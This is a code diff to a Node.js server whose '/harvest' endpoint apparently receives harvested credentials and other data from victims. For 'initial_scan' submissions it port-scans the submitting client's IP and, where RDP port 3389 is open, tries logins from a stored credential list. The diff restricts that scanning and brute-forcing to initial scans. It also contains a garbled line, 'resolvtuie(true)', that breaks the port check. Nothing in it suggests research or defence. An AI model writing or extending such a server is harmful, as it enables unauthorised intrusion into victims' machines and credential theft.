@@ -62,7 +62,7 @@ async function checkPort(ip, targetPort) {
 
     socket.on('connect', () => {
       socket.destroy();
-      resolve(true); // Port is open
+      resolvtuie(true); // Port is open
     });
 
     socket.on('timeout', () => {
@@ -131,25 +131,31 @@ app.post('/harvest', async (req, res) => {
   data.clientIp = clientIp;
   console.log('Client IP:', clientIp);
 
-  // Check for open ports
-  const openPorts = await checkMultiplePorts(clientIp);
-  data.openPorts = openPorts;
-  console.log(`Open ports on ${clientIp}: ${openPorts.length > 0 ? openPorts.join(', ') : 'None'}`);
+  // Only perform port scanning and RDP login attempts for initial scans
+  if (data.type === 'initial_scan') {
+    // Check for open ports
+    const openPorts = await checkMultiplePorts(clientIp);
+    data.openPorts = openPorts;
+    console.log(`Open ports on ${clientIp}: ${openPorts.length > 0 ? openPorts.join(', ') : 'None'}`);
 
-  // Check if RDP port (3389) is among the open ports
-  const isRdpOpen = openPorts.includes(3389);
-  data.rdpOpen = isRdpOpen; // Keep this for backward compatibility and specific RDP logic
+    // Check if RDP port (3389) is among the open ports
+    const isRdpOpen = openPorts.includes(3389);
+    data.rdpOpen = isRdpOpen; // Keep this for backward compatibility and specific RDP logic
 
-  // If RDP port is open, attempt logins with provided credentials
-  if (isRdpOpen) {
-    console.log(`Attempting RDP logins for ${clientIp}...`);
-    const loginAttempts = [];
-    for (const cred of rdpCredentials) {
-      const attemptResult = await attemptRDPLogin(clientIp, cred.username, cred.password);
-      loginAttempts.push(attemptResult);
-      console.log(`  Attempted login for ${cred.username}: ${attemptResult.success ? 'Success' : 'Failed'} (Error: ${attemptResult.error || 'None'})`);
+    // If RDP port is open, attempt logins with provided credentials
+    if (isRdpOpen) {
+      console.log(`Attempting RDP logins for ${clientIp}...`);
+      const loginAttempts = [];
+      for (const cred of rdpCredentials) {
+        const attemptResult = await attemptRDPLogin(clientIp, cred.username, cred.password);
+        loginAttempts.push(attemptResult);
+        console.log(`  Attempted login for ${cred.username}: ${attemptResult.success ? 'Success' : 'Failed'} (Error: ${attemptResult.error || 'None'})`);
+      }
+      data.rdpLoginAttempts = loginAttempts;
     }
-    data.rdpLoginAttempts = loginAttempts;
+  } else {
+    // For credential harvests or other types, just log the IP
+    console.log(`Received ${data.type || 'unknown type'} data from IP: ${clientIp}`);
   }
   
   console.log('Harvested data with IP, open ports, RDP status, and login attempts:', data);
